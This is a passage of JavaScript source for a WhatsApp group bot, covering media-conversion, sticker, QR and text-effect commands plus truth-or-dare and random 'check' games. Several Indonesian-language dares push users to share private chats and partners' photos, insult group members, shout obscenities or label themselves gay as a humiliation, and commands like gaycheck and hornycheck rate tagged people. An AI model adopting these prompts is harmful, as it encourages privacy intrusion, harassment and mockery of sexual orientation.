            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) return replygcxeon('Reply video')
if (!/webp/.test(mime)) return replygcxeon(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcxeon(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await XeonBotInc.sendMessage(from, { image: medi, caption:"Ini dia!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
"Makan 2 sendok makan nasi tanpa lauk apapun, jika terasa berat, kamu bisa minum.",
"Sebutkan orang yang membuatmu terdiam",
"Telepon gebetan/pacar sekarang dan kirim tangkapan layar di sini",
"Kirim emot hanya setiap kali kamu mengetik di grup obrolan/obrolan pribadi selama 1 hari.",
"Ucapkan 'Selamat datang di Who Wants To Be a Millionaire!' ke semua grup yang kamu punya",
"Telepon mantan dengan mengatakan rindu",
"nyanyikan chorus dari lagu terakhir yang kamu mainkan",
"Rekam suara untuk mantan/pacar/gebemmu, katakan 'Hai (nama), ingin menelepon, tunggu sebentar. Aku sangat merindukanmu'",
"Pukul meja (yang ada di rumah) sampai kamu dimarahi karena berisik",
"Katakan pada orang asing 'Aku baru saja diberitahu bahwa aku adalah saudaramu yang pertama, kami berpisah, lalu aku melakukan operasi plastik. Dan ini hal paling 'ciyusss'",
"Sebutkan nama mantan",
"buat 1 sajak untuk anggota grup!",
"Kirim daftar percakapan WhatsAppmu",
"Obrol dengan orang asing dengan bahasa ghetto lalu tangkap layar di sini",
"Ceritakan versimu sendiri tentang hal-hal memalukan",
"Tag orang yang kamu benci",
"Pura-pura seperti terkena pengaruh, misalnya: terkena pengaruh anjing, terkena pengaruh belalang, terkena pengaruh lemari es, dll.",
"Ubah nama menjadi *I AM DONKEY* selama 24 jam",
"Teriak *ma chuda ma chuda ma chuda* di depan rumahmu",
"Ambil foto/potret pacar atau gebetanmu dan kirimkan di sini",
"Ceritakan tipe pacar yang kamu sukai!",
"Ucapkan *aku naksir kamu, maukah kamu menjadi pacarku?* kepada lawan jenis, terakhir kali kamu berbicara dengannya (kirim di WA/Telegram), tunggu sampai dia membalas, jika sudah, berikan di sini",
"Rekam suaramu yang membaca *titar ke age do titar, titar ke piche do titar*",
"Chatingan lelucon dengan mantan dan katakan *aku mencintaimu, tolong kembalilah.* tanpa menyebutkan bahwa itu adalah tantangan!",
"Obrol dengan kontak WhatsApp berurutan sesuai dengan persentase baterai ponselmu, lalu katakan 'Aku beruntung memiliki kamu!'",
"Ubah nama menjadi *I am a child of randi* selama 5 jam",
"Ketik dalam bahasa Bengali selama 24 jam",
"Gunakan foto Selmon Bhoi selama 3 hari",
"Kirim kutipan lagu lalu tag anggota yang cocok untuk kutipan tersebut",
"Kirim pesan suara dengan ucapan 'Bolehkah aku memanggilmu sayang?'",
"Tangkapan layar percakapan terakhir di WhatsAppmu",
"Ucapkan *KAMU SANGAT CANTIK, JANGAN BERBOHONG* kepada teman pria!",
"Telepon salah satu anggota grup dan katakan kata kasar kepada mereka",
"Berlakulah seperti ayam di depan orangtua kamu",
"Ambil sebuah buku secara acak dan bacakan satu halaman secara keras dan rekam suara lalu kirimkan di sini",
"Buka pintu depan rumahmu dan menyalak seperti serigala selama 10 detik",
"Ambil foto selfie yang memalukan dan jadikan sebagai foto profilmu",
"Biar grup memilih sebuah kata dan lagu yang dikenal. Kamu harus menyanyikan lagu tersebut dan kirim dalam bentuk pesan suara di sini",
"Berjalanlah dengan menopang dengan siku dan lutut selama yang kamu bisa",
"nyanyikan lagu kebangsaan dalam pesan suara",
"Lakukan breakdance selama 30 detik di ruang tamu",
"Ceritakan cerita sedih yang kamu ketahui",
"Buat video tari twerk singkat dan unggah sebagai status selama 5 menit",
"Makan sepotong bawang putih mentah",
"Tunjukkan lima orang terakhir yang kamu kirim pesan dan isi pesan mereka",
"Jadikan nama lengkapmu sebagai status selama 5 jam",
"Buat video tari singkat tanpa filter hanya dengan musik dan unggah sebagai status selama 5 jam",
"Telepon sahabatmu, omong kosong",
"Jadikan foto dirimu tanpa filter sebagai status selama 10 menit",
"Ucapkan 'aku cinta Oli London' dalam pesan suara 😄",
"Kirim pesan kepada mantanmu dan katakan bahwa kamu masih menyukainya",
"Telepon gebetan/pacar/sahabatmu sekarang dan tangkapan layar di sini",
"Berkata kasar pada salah satu anggota grup di percakapan pribadi dan katakan 'kamu jelek, beban'",
"Ucapkan 'KAMU CANTIK/GANTENG' pada salah satu orang yang ada di atas pinlistmu atau orang pertama di daftar percakapanmu",
"Kirim pesan suara dan katakan 'Bisakah aku memanggilmu sayang?'. Jika kamu seorang pria, sebutkan nama seorang wanita. Jika kamu seorang wanita, sebutkan nama seorang pria",
"Tulis 'Aku mencintaimu (nama anggota grup acak yang sedang online) dalam percakapan pribadi (jika kamu pria, tulis nama wanita; jika kamu wanita, tulis nama pria), ambil tangkapan layar dan kirimkan di sini",
"Gunakan foto aktor Bollywood sebagai foto profilmu selama 3 hari",
"Jadikan foto crushmu sebagai status dengan caption 'Ini adalah crushku'",
"Ubah nama menjadi *I AM GAY* selama 5 jam",
"Obrol dengan salah satu kontak di WhatsApp dan katakan 'Aku akan menjadi pacarmu selama 5 jam'",
"Kirim pesan suara dan katakan 'Aku naksir kamu, maukah kamu menjadi pacarku?' kepada orang acak dari grup (jika kamu perempuan, pilih nama laki-laki; jika kamu laki-laki, pilih nama perempuan)",
"Pukul pantatmu dengan keras dan kirim suara tamparan melalui pesan suara 😂",
"Sebutkan tipe pacarmu dan kirim fotonya di sini dengan keterangan 'Perempuan/laki-laki paling jelek di dunia'",
"Teriak 'bravooooooooo' dan kirimkan melalui pesan suara di sini",
"Ambil foto wajahmu dan kirim di sini",
"Kirim foto dirimu dengan keterangan 'Aku lesbian'",
"Teriak dengan menggunakan kata-kata kasar dan kirim melalui pesan suara",
"Teriak 'kamu bajingan' di depan ibu atau ayahmu",
"Ubah nama menjadi *aku bodoh selama 24 jam*",
"Pukul dirimu sendiri dengan mantap dan kirim suara pukulan melalui pesan suara 😂",
"Ucapkan 'aku cinta pemilik bot danz' melalui pesan suara",
"Kirim foto pacar atau gebetanmu di sini",
"Buat video tantangan tarian TikTok apa pun dan unggah sebagai status, kamu bisa menghapusnya setelah 5 jam",
"Putuskan pertemanan dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu adalah tantangan",
"Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikahinya, tanpa memberitahunya bahwa itu adalah tantangan",
"Ucapkan 'aku cinta Depak Kalal' melalui pesan suara",
"Tulis 'aku merasa horny' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Tulis 'aku lesbian' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Cium ibu atau ayahmu dan katakan 'aku mencintaimu' 😌",
"Jadikan nama ayahmu sebagai status selama 5 jam",
"Kirim kata-kata kasar dalam grup manapun, kecuali grup ini, dan kirim bukti tangkapan layarnya di sini"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              XeonBotInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
        break
       case 'truth':
              const truth =[
"Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Jika kamu bisa atau jika kamu mau, grup obrolan atau grup di luar mana yang ingin kamu jadikan teman? (bisa berbeda/jenis yang sama)",
    "Apa ketakutan terbesar kamu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang dulu pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang dari ayah atau ibumu? Alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Pernahkah kamu memiliki perasaan cinta satu arah? jika ya kepada siapa? bagaimana perasaannya, bro?",
    "Pernah menjadi selingkuhan seseorang?",
    "Hal paling ditakuti?",
    "Siapa orang yang paling berpengaruh dalam hidupmu?",
    "Prestasi apa yang berhasil kamu raih tahun ini?",
    "Siapa orang yang bisa membuatmu keren?",
    "Siapa orang yang pernah membuatmu sangat bahagia?",
    "Siapa yang paling mendekati tipe pasangan idamanmu di sini?",
    "Dengan siapa kamu suka bermain?",
    "Pernahkah kamu menolak seseorang? alasan mengapa?",
    "Sebutkan insiden yang pernah menyakiti perasaanmu yang masih kamu ingat",
    "Prestasi apa yang sudah kamu capai tahun ini?",
    "Kebiasaan terburukmu di sekolah?",
    "Lagu apa yang paling sering kamu nyanyikan di dalam kamar mandi?",
    "Pernahkah kamu mengalami pengalaman dekat dengan kematian?",
    "Kapan terakhir kali kamu sangat marah? Mengapa?",
    "Siapa orang terakhir yang meneleponmu?",
    "Apakah kamu memiliki bakat tersembunyi? Apa sajakah itu?",
    "Kata apa yang paling kamu benci?",
    "Video YouTube terakhir apa yang kamu tonton?",
    "Hal terakhir apa yang kamu cari di Google?",
    "Dalam grup ini, dengan siapa yang ingin kamu tukar kehidupan selama seminggu?",
    "Apa hal paling menakutkan yang pernah terjadi padamu?",
    "Pernahkah kamu kentut dan menyalahkannya kepada orang lain?",
    "Kapan terakhir kali kamu membuat orang lain menangis?",
    "Pernahkah kamu menghilangkan jejak dari seorang teman?",
    "Pernahkah kamu melihat mayat?",
    "Anggota keluargamu yang paling mengganggumu dan mengapa?",
    "Jika kamu harus menghapus satu aplikasi dari ponselmu, aplikasi mana yang akan kamu hapus?",
    "Aplikasi apa yang paling sering kamu buang-buang waktu di dalamnya?",
    "Pernahkah kamu berpura-pura sakit untuk pulang dari sekolah?",
    "Apa barang paling memalukan di dalam kamar kamarmu?",
    "Jika terdampar di pulau terpencil, lima barang apa yang akan kamu bawa?",
    "Pernahkah kamu tertawa begitu keras hingga pipismu basah?",
    "Apakah kamu mencium bau kentutmu sendiri?",
    "Pernahkah kamu kencing di tempat tidur saat tidur?",
    "Apa kesalahan terbesar yang pernah kamu buat?",
    "Pernahkah kamu mencontek dalam ujian?",
    "Apa hal terburuk yang pernah kamu lakukan?",
    "Kapan terakhir kali kamu menangis?",
    "Di antara orang tua kamu, siapa yang kamu cintai paling?",
    "Apakah kamu kadang-kadang memasukkan jari ke dalam lubang hidungmu?",
    "Siapa pujaan hati kamu saat masa sekolah dulu?",
    "Berbicara jujur, apakah kamu menyukai seorang anak laki-laki dalam grup ini?",
    "Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang milik ibu atau ayahmu? Apa alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Apakah kamu menyukai seseorang dalam grup ini? Jika ya, siapa?",
    "Pernahkah kamu ditipu oleh seseorang?",
    "Siapa orang yang paling penting dalam hidupmu?",
    "Prestasi apa yang telah kamu capai tahun ini?",
    "Siapa orang yang bisa membuatmu bahagia saat sedang sedih?",
    "Siapa orang yang pernah membuatmu merasa tidak nyaman?",
    "Pernahkah kamu berbohong kepada orang tua?",
    "Apakah kamu masih menyukai mantan pacarmu?",
    "Siapa yang ingin kamu ajak bermain bersama?",
    "Pernahkah kamu mencuri sesuatu yang besar? Alasannya apa?",
    "Sebutkan insiden yang pernah membuatmu terluka dan masih kamu ingat?",
    "Prestasi apa yang sudah kamu raih tahun ini?",
    "Apa kebiasaan terburukmu saat di sekolah?",
    "Apakah kamu mencintai pencipta bot ini, Dani 😄",
    "Pernahkah kamu berpikir untuk membalas dendam pada guru?",
    "Apakah kamu menyukai perdana menteri saat ini di negaramu?",
    "Apakah kamu vegetarian atau non-vegetarian?",
    "Jika kamu bisa menjadi tak terlihat, apa yang pertama kali akan kamu lakukan?",
    "Apa rahasia yang kamu simpan dari orang tua kamu?",
    "Siapa pujaan hati rahasiamu?",
    "Siapa orang terakhir yang kamu intip di media sosial?",
    "Jika seorang jin memberimu tiga permintaan, apa yang akan kamu minta?",
    "Apa penyesalan terbesarmu?",
    "Hewan seperti apa menurutmu yang paling mirip denganmu?",
    "Berapa banyak foto selfie yang kamu ambil dalam sehari?",
    "Apa acara favoritmu saat masa kanak-kanak?",
    "Jika kamu bisa menjadi karakter fiksi dalam satu hari, siapa yang akan kamu pilih?",
    "Dengan siapa kamu paling sering mengirim pesan?",
    "Apa kebohongan terbesar yang pernah kamu ceritakan kepada orang tua kamu?",
    "Siapa selebriti yang menjadi pujaan hatimu?",
    "Mimpi paling aneh yang pernah kamu alami?",
    "Apakah kamu bermain PUBG? Jika ya, berikan nomor ID-mu."
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              XeonBotInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ["Baik", "Tidak ramah", "Chapri", "Nibba/nibbi", "Mengganggu", "Rusak", "Orang marah", "Sopan", "Beban", "Hebat", "Cringe", "Pembohong"]
					var hoby = ['Memasak','Menari','Bermain','Bermain game','Melukis','Membantu Orang Lain','Menonton anime','Membaca','Bersepeda','Bernyanyi','Berbincang-bincang','Berbagi Meme','Menggambar','Menghabiskan Uang Orang Tua','Bermain Truth or Dare','Menghabiskan Waktu Sendirian']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya', 'Tidak', 'Sangat jelek', 'Sangat tampan']
					var wetak= ['Peduli','Murah hati','Orang marah','Maaf','Tunduk','Baik','Maafkan aku','Berhati baik','Sabar','UwU','Terbaik','Membantu']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*karakteristik :* ${sipat}
*Hobby :* ${biho}
*bucin :* ${bhucin}%
*Great :* ${senga}%
*Ganteng :* ${chakep}
*Character :* ${watak}
*Moral Baik :* ${baik}%
*Morals Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Penakut :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
XeonBotInc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	reply(mess.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replygcxeon(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await XeonBotInc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replygcxeon(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcxeon(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await XeonBotInc.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await XeonBotInc.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      XeonBotInc.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcxeon('Error')
    }
    }
    break

case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Berhasil menghapus semua Kenangan <3")
	 
	});
	  }
	break 
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replygcxeon(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					XeonBotInc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replygcxeon(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replygcxeon(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcxeon('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replygcxeon(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {

if (!q) return replygcxeon(`Example : ${prefix+command} XeonBotInc`) 
reply(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
